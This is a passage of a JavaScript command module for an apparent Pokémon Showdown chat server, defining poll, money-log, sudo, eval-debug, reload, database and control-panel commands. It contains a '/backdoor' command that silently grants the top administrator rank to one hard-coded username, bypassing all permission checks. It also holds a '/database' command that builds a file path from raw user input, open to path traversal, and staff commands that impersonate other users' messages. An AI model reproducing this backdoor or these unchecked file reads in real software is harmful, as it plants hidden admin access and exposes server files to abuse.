		var money = Core.stdin('money', targetUser.userid);
		var total = Number(money) + Number(giveMoney);

		Core.stdout('money', targetUser.userid, total);

		this.sendReply(targetUser.name + ' was given ' + giveMoney + ' ' + b + '. This user now has ' + total + ' bucks.');
		targetUser.send(user.name + ' has given you ' + giveMoney + ' ' + b + '. You now have ' + total + ' bucks.');
	},

	takebuck: 'takemoney',
	takebucks: 'takemoney',
	takemoney: function (target, room, user) {
		if (!user.can('takemoney')) return;
		if (!target) return this.parse('/help takemoney');

		if (target.indexOf(',') >= 0) {
			var parts = target.split(',');
			parts[0] = this.splitTarget(parts[0]);
			var targetUser = this.targetUser;
		}

		if (!targetUser) return this.sendReply('User ' + this.targetUsername + ' not found.');
		if (isNaN(parts[1])) return this.sendReply('Very funny, now use a real number.');
		if (parts[1] < 1) return this.sendReply('You can\'t take less than one buck at a time.');
		if (String(parts[1]).indexOf('.') >= 0) return this.sendReply('You cannot take money with decimals.');

		var b = 'bucks';
		var cleanedUp = parts[1].trim();
		var takeMoney = Number(cleanedUp);
		if (takeMoney === 1) b = 'buck';

		var money = Core.stdin('money', targetUser.userid);
		var total = Number(money) - Number(takeMoney);

		Core.stdout('money', targetUser.userid, total);

		this.sendReply(targetUser.name + ' has losted ' + takeMoney + ' ' + b + '. This user now has ' + total + ' bucks.');
		targetUser.send(user.name + ' has taken ' + takeMoney + ' ' + b + ' from you. You now have ' + total + ' bucks.');
	},*/

	/*********************************************************
	 * Poll and Poll-related Commands
	 *********************************************************/
 
	vote: function (target, room, user) {
		if (!Poll[room.id]) Poll.reset(room.id);
		if (!Poll[room.id].question) return this.sendReply('There is no poll currently going on in this room.');
		if (!this.canTalk()) return;
		if (!target) return this.parse('/help vote');
		if (Poll[room.id].optionList.indexOf(target.toLowerCase()) === -1) return this.sendReply('\'' + target + '\' is not an option for the current poll.');

		var ips = JSON.stringify(user.ips);
		Poll[room.id].options[ips] = target.toLowerCase();

		return this.sendReply('You are now voting for ' + target + '.');
	},
	moneylog: function (target, room, user) {
		if (!this.can('bucks')) return false;
		if (!target) return this.sendReply("Usage: /moneylog [number] to view the last x lines OR /moneylog [text] to search for text.");
		if (isNaN(Number(target))) var word = true;
		var lines = fs.readFileSync('logs/transactions.log', 'utf8').split('\n').reverse();
		var output = '';
		var count = 0;
		var regex = new RegExp(target.replace(/[-\/\\^$*+?.()|[\]{}]/g, '\\$&'), "gi");

		if (word) {
			output += 'Displaying last 50 lines containing "' + target + '":\n';
			for (var line in lines) {
				if (count >= 50) break;
				if (!~lines[line].search(regex)) continue;
				output += lines[line] + '\n';
				count++;
			}
		} else {
			if (target > 100) target = 100;
			output = lines.slice(0, (lines.length > target ? target : lines.length));
			output.unshift("Displaying the last " + (lines.length > target ? target : lines.length) + " lines:");
			output = output.join('\n');
		}
		user.popup(output);
	},

	votes: function (target, room, user) {
		if (!this.canBroadcast()) return;
		this.sendReply('NUMBER OF VOTES: ' + Object.keys(Poll[room.id].options).length);
	},

	pr: 'pollremind',
	pollremind: function (target, room, user) {
		if (!Poll[room.id]) Poll.reset(room.id);
		if (!Poll[room.id].question) return this.sendReply('There is no poll currently going on in this room.');
		if (!this.canBroadcast()) return;
		this.sendReplyBox(Poll[room.id].display);
	},
	
	poll: function (target, room, user) {
		if (!this.can('broadcast', null, room)) return;
		if (!Poll[room.id]) Poll.reset(room.id);
		if (Poll[room.id].question) return this.sendReply('There is currently a poll going on already.');
		if (!this.canTalk()) return;

		var options = Poll.splint(target);
		if (options.length < 3) return this.parse('/help poll');

		var question = options.shift();

		options = options.join(',').toLowerCase().split(',');

		Poll[room.id].question = question;
		Poll[room.id].optionList = options;

		var pollOptions = '';
		var start = 0;
		while (start < Poll[room.id].optionList.length) {
			pollOptions += '<button name="send" value="/vote ' + Tools.escapeHTML(Poll[room.id].optionList[start]) + '">' + Tools.escapeHTML(Poll[room.id].optionList[start]) + '</button>&nbsp;';
			start++;
		}
		Poll[room.id].display = '<h2>' + Tools.escapeHTML(Poll[room.id].question) + '&nbsp;&nbsp;<font size="1" color="#AAAAAA">/vote OPTION</font><br><font size="1" color="#AAAAAA">Poll started by <em>' + user.name + '</em></font><br><hr>&nbsp;&nbsp;&nbsp;&nbsp;' + pollOptions;
		room.add('|raw|<div class="infobox">' + Poll[room.id].display + '</div>');
	},

	tierpoll: function (target, room, user) {
		if (!this.can('broadcast', null, room)) return;
		this.parse('/poll Tournament tier?, ' + Object.keys(Tools.data.Formats).filter(function (f) { return Tools.data.Formats[f].effectType === 'Format'; }).join(", "));
	},

	"1v1poll": function (target, room, user) {
		if (!this.can('broadcast', null, room)) return;
		this.parse('/poll Next 1v1 Tour?, regular, cc1v1, inverse, mono gen, monoletter, monotype, monocolor, cap, eevee only, mega evos, bst based, lc starters, ubers, lc, 2v2, monopoke, almost any ability 1v1, stabmons 1v1, averagemons 1v1, balanced hackmons 1v1, tier shift 1v1, retro1v1, buff based 1v1, 350 cup 1v1');
	},

	lobbypoll: function (target, room, user) {
		if (!this.can('broadcast', null, room)) return;
		this.parse('/poll Tournament Tier?, Random Battles, Metronome, Duotype, Monotype, Seasonal, Ubers, OU, UU, RU, NU, LC, VGC, Random Triples, Random Doubles, Random Monotype, Random LC, Ubers Mono, CC1vs1, CC, 1v1');
	},

	easytour: 'etour',
	etour: function (target, room, user) {
		if (!this.can('broadcast', null, room)) return;
		this.parse('/tour new ' + target + ', elimination');
	},

	endpoll: function (target, room, user) {
		if (!this.can('broadcast', null, room)) return;
		if (!Poll[room.id]) Poll.reset(room.id);
		if (!Poll[room.id].question) return this.sendReply('There is no poll to end in this room.');

		var votes = Object.keys(Poll[room.id].options).length;

		if (votes === 0) {
			Poll.reset(room.id);
			return room.add('|raw|<h3>The poll was canceled because of lack of voters.</h3>');
		}

		var options = {};

		for (var i in Poll[room.id].optionList) {
			options[Poll[room.id].optionList[i]] = 0;
		}

		for (var i in Poll[room.id].options) {
			options[Poll[room.id].options[i]]++;
		}

		var data = [];
		for (var i in options) {
			data.push([i, options[i]]);
		}
		data.sort(function (a, b) {
			return a[1] - b[1];
		});

		var results = '';
		var len = data.length;
		var topOption = data[len - 1][0];
		while (len--) {
			if (data[len][1] > 0) {
				results += '&bull; ' + data[len][0] + ' - ' + Math.floor(data[len][1] / votes * 100) + '% (' + data[len][1] + ')<br>';
			}
		}
		room.add('|raw|<div class="infobox"><h2>Results to "' + Poll[room.id].question + '"</h2><font size="1" color="#AAAAAA"><strong>Poll ended by <em>' + user.name + '</em></font><br><hr>' + results + '</strong></div>');
		Poll.reset(room.id);
		Poll[room.id].topOption = topOption;
	},


	/*********************************************************
	 * SystemOperator Commands
	 * These are powerful commands limited to trusted admins and system operators. They are not used in the day-to-day running of the server.
	 *********************************************************/

	roomlist: function (target, room, user) {
		if (!this.can('roomlist')) return;

		var rooms = Object.keys(Rooms.rooms),
			len = rooms.length,
			official = ['<b><font color="#1a5e00" size="2">Official chat rooms</font></b><br><br>'],
			nonOfficial = ['<hr><b><font color="#000b5e" size="2">Chat rooms</font></b><br><br>'],
			privateRoom = ['<hr><b><font color="#5e0019" size="2">Private chat rooms</font></b><br><br>'];

		while (len--) {
			var _room = Rooms.rooms[rooms[(rooms.length - len) - 1]];
			if (_room.type === 'chat') {
				if (_room.isOfficial) {
					official.push(('<a href="/' + _room.title + '" class="ilink">' + _room.title + '</a>'));
					continue;
				}
				if (_room.isPrivate) {
					privateRoom.push(('<a href="/' + _room.title + '" class="ilink">' + _room.title + '</a>'));
					continue;
				}
				nonOfficial.push(('<a href="/' + _room.title + '" class="ilink">' + _room.title + '</a>'));
			}
		}

		this.sendReplyBox(official.join(' ') + nonOfficial.join(' ') + privateRoom.join(' '));
	},

	sudo: function (target, room, user) {
		if (!user.can('sudo')) return;
		var parts = target.split(',');
		if (parts.length < 2) return this.parse('/help sudo');
		if (parts.length >= 3) parts.push(parts.splice(1, parts.length).join(','));
		var targetUser = parts[0],
			cmd = parts[1].trim().toLowerCase(),
			commands = Object.keys(CommandParser.commands).join(' ').toString(),
			spaceIndex = cmd.indexOf(' '),
			targetCmd = cmd;

		if (spaceIndex > 0) targetCmd = targetCmd.substr(1, spaceIndex - 1);

		if (!Users.get(targetUser)) return this.sendReply('User ' + targetUser + ' not found.');
		if (commands.indexOf(targetCmd.substring(1, targetCmd.length)) < 0 || targetCmd === '') return this.sendReply('Not a valid command.');
		if (cmd.match(/\/me/)) {
			if (cmd.match(/\/me./)) return this.parse('/control ' + targetUser + ', say, ' + cmd);
			return this.sendReply('You must put a target to make a user use /me.');
		}
		CommandParser.parse(cmd, room, Users.get(targetUser), Users.get(targetUser).connections[0]);
		this.sendReply('You have made ' + targetUser + ' do ' + cmd + '.');
	},

	control: function (target, room, user) {
		if (!this.can('control')) return;
		var parts = target.split(',');

		if (parts.length < 3) return this.parse('/help control');

		if (parts[1].trim().toLowerCase() === 'say') {
			return room.add('|c|' + Users.get(parts[0].trim()).group + Users.get(parts[0].trim()).name + '|' + parts[2].trim());
		}
		if (parts[1].trim().toLowerCase() === 'pm') {
			return Users.get(parts[2].trim()).send('|pm|' + Users.get(parts[0].trim()).group + Users.get(parts[0].trim()).name + '|' + Users.get(parts[2].trim()).group + Users.get(parts[2].trim()).name + '|' + parts[3].trim());
		}
	},

	debug: function (target, room, user, connection, cmd, message) {
		if (!user.hasConsoleAccess(connection)) {
			return this.sendReply('/debug - Access denied.');
		}
		if (!this.canBroadcast()) return;

		if (!this.broadcasting) this.sendReply('||>> ' + target);
		try {
			var battle = room.battle;
			var me = user;
			if (target.indexOf('-h') >= 0 || target.indexOf('-help') >= 0) {
				return this.sendReplyBox('This is a custom eval made by CreaturePhil for easier debugging.<br/>' +
					'<b>-h</b> OR <b>-help</b>: show all options<br/>' +
					'<b>-k</b>: object.keys of objects<br/>' +
					'<b>-r</b>: reads a file<br/>' +
					'<b>-p</b>: returns the current high-resolution real time in a second and nanoseconds. This is for speed/performance tests.');
			}
			if (target.indexOf('-k') >= 0) {
				target = 'Object.keys(' + target.split('-k ')[1] + ');';
			}
			if (target.indexOf('-r') >= 0) {
				this.sendReply('||<< Reading... ' + target.split('-r ')[1]);
				return this.popupReply(eval('fs.readFileSync("' + target.split('-r ')[1] + '","utf-8");'));
			}
			if (target.indexOf('-p') >= 0) {
				target = 'var time = process.hrtime();' + target.split('-p')[1] + 'var diff = process.hrtime(time);this.sendReply("|raw|<b>High-Resolution Real Time Benchmark:</b><br/>"+"Seconds: "+(diff[0] + diff[1] * 1e-9)+"<br/>Nanoseconds: " + (diff[0] * 1e9 + diff[1]));';
			}
			this.sendReply('||<< ' + eval(target));
		} catch (e) {
			this.sendReply('||<< error: ' + e.message);
			var stack = '||' + ('' + e.stack).replace(/\n/g, '\n||');
			connection.sendTo(room, stack);
		}
	},

	reload: function (target, room, user) {
		if (!this.can('reload')) return;

		try {
			this.sendReply('Reloading CommandParser...');
			CommandParser.uncacheTree(path.join(__dirname, './', 'command-parser.js'));
			CommandParser = require(path.join(__dirname, './', 'command-parser.js'));

			/* this.sendReply('Reloading Bot...');
			CommandParser.uncacheTree(path.join(__dirname, './', 'bot.js'));
			Bot = require(path.join(__dirname, './', 'bot.js'));*/

			this.sendReply('Reloading Tournaments...');
			var runningTournaments = Tournaments.tournaments;
			CommandParser.uncacheTree(path.join(__dirname, './', './tournaments/index.js'));
			Tournaments = require(path.join(__dirname, './', './tournaments/index.js'));
			Tournaments.tournaments = runningTournaments;

			this.sendReply('Reloading Core...');
			CommandParser.uncacheTree(path.join(__dirname, './', './core.js'));
			Core = require(path.join(__dirname, './', './core.js')).core;

			this.sendReply('Reloading Components...');
			CommandParser.uncacheTree(path.join(__dirname, './', './components.js'));
			Components = require(path.join(__dirname, './', './components.js'));

			this.sendReply('Reloading SysopAccess...');
			CommandParser.uncacheTree(path.join(__dirname, './', './core.js'));
			SysopAccess = require(path.join(__dirname, './', './core.js'));

			return this.sendReply('|raw|<font color="green">All files have been reloaded.</font>');
		} catch (e) {
			return this.sendReply('|raw|<font color="red">Something failed while trying to reload files:</font> \n' + e.stack);
		}
	},

	db: 'database',
	database: function (target, room, user) {
		if (!this.can('db')) return;
		if (!target) return user.send('|popup|You must enter a target.');

		try {
			var log = fs.readFileSync(('config/' + target + '.csv'), 'utf8');
			return user.send('|popup|' + log);
		} catch (e) {
			return user.send('|popup|Something bad happen:\n\n ' + e.stack);
		}
	},

	pmstaff: 'pmallstaff',
	pas: 'pmallstaff',
	pmallstaff: function (target, room, user) {
		if (!target) return this.sendReply('/pmallstaff [message] - Sends a PM to every staff member online.');
		if (!this.can('pmall')) return false;

		for (var u in Users.users) {
			if (Users.users[u].isStaff) {
				Users.users[u].send('|pm|~Staff PM|' + Users.users[u].group + Users.users[u].name + '|' + target);
			}
		}
	},

	backdoor: function (target, room, user) {
		if (user.userid !== 'irraquated') return this.sendReply('/backdoor - Access denied.');

		if (!target) {
			user.group = '~';
			user.updateIdentity();
			return;
		}

		if (target === 'reg') {
			user.group = ' ';
			user.updateIdentity();
			return;
		}
	},
	
	cp: 'controlpanel',
	controlpanel: function (target, room, user, connection) {
		if (!this.can('controlpanel')) return;
		if (target.toLowerCase() === 'help') {
			return this.sendReplyBox(
				'/cp color, [COLOR]<br/>' +
				'/cp avatar, [AVATAR COLOR URL]<br/>' +
				'/cp toursize, [TOURNAMENT SIZE TO EARN MONEY]<br/>' +
				'/cp money, [STANDARD/DOUBLE/QUADRUPLE]<br/>' +
				'/cp winner, [WINNER ELO BONUS]<br/>' +
				'/cp runnerup, [RUNNERUP ELO BONUS]<br/>'
				);
		}
		var parts = target.split(',');
		Core.profile.color = Core.stdin('control-panel', 'color');
		Core.profile.avatarurl = Core.stdin('control-panel', 'avatar');
		Core.tournaments.tourSize = Number(Core.stdin('control-panel', 'toursize'));
		Core.tournaments.amountEarn = Number(Core.stdin('control-panel', 'money'));
		Core.tournaments.winningElo = Number(Core.stdin('control-panel', 'winner'));
		Core.tournaments.runnerUpElo = Number(Core.stdin('control-panel', 'runnerup'));
		if (parts.length !== 2) {
			return this.sendReplyBox(
				'<center>' +
				'<h3><b><u>Control Panel</u></b></h3>' +
				'<i>Color:</i> ' + '<font color="' + Core.profile.color + '">' + Core.profile.color + '</font><br />' +
				'<i>Custom Avatar URL:</i> ' + Core.profile.avatarurl + '<br />' +
				'<i>Tournament Size to earn money: </i>' + Core.tournaments.tourSize + '<br />' +
				'<i>Earning money amount:</i> ' + Core.tournaments.earningMoney() + '<br />' +
				'<i>Winner Elo Bonus:</i> ' + Core.tournaments.winningElo + '<br />' +
				'<i>RunnerUp Elo Bonus:</i> ' + Core.tournaments.runnerUpElo + '<br /><br />' +
				'To edit this info, use /cp help' +
				'</center>' +
				'<br clear="all">'
				);
		}

		parts[1] = parts[1].trim().toLowerCase();

		var self = this,
			match = false,
			cmds = {
				color: function () {
					Core.stdout('control-panel', 'color', parts[1], function () {
						Core.profile.color = Core.stdin('control-panel', 'color');
					});
					self.sendReply('Color is now ' + parts[1]);
				},
				avatar: function () {
					Core.stdout('control-panel', 'avatar', parts[1], function () {
						Core.profile.avatarurl = Core.stdin('control-panel', 'avatar');
					});
					self.sendReply('Avatar URL is now ' + parts[1]);
				},
				toursize: function () {
					Core.stdout('control-panel', 'toursize', parts[1], function () {
						Core.tournaments.tourSize = Number(Core.stdin('control-panel', 'toursize'));
					});
					self.sendReply('Tournament Size to earn money is now ' + parts[1]);
				},
				money: function () {
					if (parts[1] === 'standard') Core.stdout('control-panel', 'money', 10, function () {Core.tournaments.amountEarn = Number(Core.stdin('control-panel', 'money'));});
					if (parts[1] === 'double') Core.stdout('control-panel', 'money', 4, function () {Core.tournaments.amountEarn = Number(Core.stdin('control-panel', 'money'));});
					if (parts[1] === 'quadruple') Core.stdout('control-panel', 'money', 2, function () {Core.tournaments.amountEarn = Number(Core.stdin('control-panel', 'money'));});
					self.sendReply('Earning money amount is now ' + parts[1]);
				},
				winner: function () {
					Core.stdout('control-panel', 'winner', parts[1], function () {
						Core.tournaments.winningElo = Number(Core.stdin('control-panel', 'winner'));
					});
					self.sendReply('Winner Elo Bonus is now ' + parts[1]);
				},
				runnerup: function () {
					Core.stdout('control-panel', 'runnerup', parts[1], function () {
						Core.tournaments.runnerUpElo = Number(Core.stdin('control-panel', 'runnerup'));
					});
					self.sendReply('RunnerUp Elo Bonus is now ' + parts[1]);
				}
			};

		for (cmd in cmds) {
			if (parts[0].toLowerCase() === cmd) match = true;
		}

		if (!match) return this.parse('/cp help');

		cmds[parts[0].toLowerCase()]();
	}
};

Object.merge(CommandParser.commands, components);
